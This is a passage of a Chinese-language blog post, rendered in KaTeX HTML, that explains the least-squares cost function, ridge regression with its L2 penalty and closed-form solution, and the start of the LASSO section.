vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>可以表示为：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>−</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo stretchy="false">(</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">J(θ)=\frac{1}{2} (h_θ(x)-y)^T(h_θ(x)-y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.00744em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><ul><li>回归系数为：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>X</mi><mi>T</mi></msup><mi>y</mi></mrow><annotation encoding="application/x-tex">θ=(X^TX)^{-1}X^Ty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></span></p><ul><li>这个问题解存在且唯一的条件就是XX列满秩: rank(X) = dim(X)。但即使 X 列满秩，但是当数据特征中存在共线性，即相关性比较大的时候，会使得标准最小二乘求解不稳定, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding="application/x-tex">X^TX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>的行列式接近零，计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding="application/x-tex">X^TX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>的时候误差会很大。这个时候我们需要在cost function上添加一个惩罚项 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>λ</mi><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msubsup><mi>θ</mi><mi>i</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">\lambda\sum_{i=1}^{n}θ_{i}^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.113818em;vertical-align:-0.29971000000000003em;"></span><span class="mord mathdefault">λ</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span></span></span></span>，称为L2正则化。</li><li>这个时候的cost function的形式就为:</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><msubsup><mi>x</mi><mi>i</mi><mi>T</mi></msubsup><mi>θ</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mi>λ</mi><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msubsup><mi>θ</mi><mi>i</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">f(θ) = \sum_{i=1}^{m} (y_i - x_{i}^{T}θ)^2 + \lambda\sum_{i=1}^{n}θ_{i}^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathdefault">λ</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li>通过加入此惩罚项进行优化后，限制了回归系数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>i</mi><mi>w</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">wiwi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span></span></span></span>的绝对值，数学上可以证明上式的等价形式如下:</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><msubsup><mi>x</mi><mi>i</mi><mi>T</mi></msubsup><mi>θ</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">f(θ) = \sum_{i=1}^{m} (y_i - x_{i}^{T}θ)^2 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msubsup><mi>θ</mi><mi>j</mi><mn>2</mn></msubsup><mo>≤</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">s.t. \sum_{i=1}^{n}θ_{j}^2 \le t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault">t</span><span class="mord">.</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-2.4530000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span></span></span></span></span></p><ul><li><p>其中t为某个阈值。</p></li><li><p>将岭回归系数用矩阵的形式表示:</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>θ</mi><mo>^</mo></mover><mo>=</mo><mo stretchy="false">(</mo><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi><mo>+</mo><mi>λ</mi><mi>I</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><msup><mi>X</mi><mi>T</mi></msup><mi>y</mi></mrow><annotation encoding="application/x-tex">\hat{θ} = (X^{T}X + \lambda I)^{-1}X^{T}y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1413309999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">λ</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></span></p><ul><li>可以看到，就是通过将 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>X</mi><mi>T</mi></msup><mi>X</mi></mrow><annotation encoding="application/x-tex">X^TX</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span> 加上一个单位矩阵是的矩阵变成非奇异矩阵并可以进行求逆运算。</li></ul><p><img src="/images/pasted-35.png" alt="梯度图" /></p><p><strong>岭回归的一些性质</strong></p><ul><li>当岭参数 $\lambda = 0 $时，得到的解是最小二乘解</li><li>当岭参数 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>λ</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">λ</span></span></span></span> 趋向更大时，岭回归系数 $θ_i $趋向于0，约束项 t 很小</li></ul><h3 id="lasso"><a class="markdownIt-Anchor" href="#lasso"></a> Lasso</h3><ul><li><p>岭回归限定了所有回归系数的平方和不大于 t , 在使用普通最小二乘法回归的时候当两个变量具有相关性的时候，可能会使得其中一个系数是个很大正数，另一个系数是很大的负数。通过岭回归的  $\sum_{i=1}^{n} θ_i \le t $的限制，可以避免这个问题。</p></li><li><p>LASSO(The Least Absolute Shrinkage and Selection Operator)是另一种缩减方法，将回归系数收缩在一定的区域内。LASSO的主要思想是构造一个一阶惩罚函数获得一个精炼的模型, 通过最终确定一些变量的系数为0进行特征筛选。</p></li><li><p>LASSO的惩罚项为:</p></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi mathvariant="normal">∣</mi><msub><mi>θ</mi><mi>i</mi></msub><mi 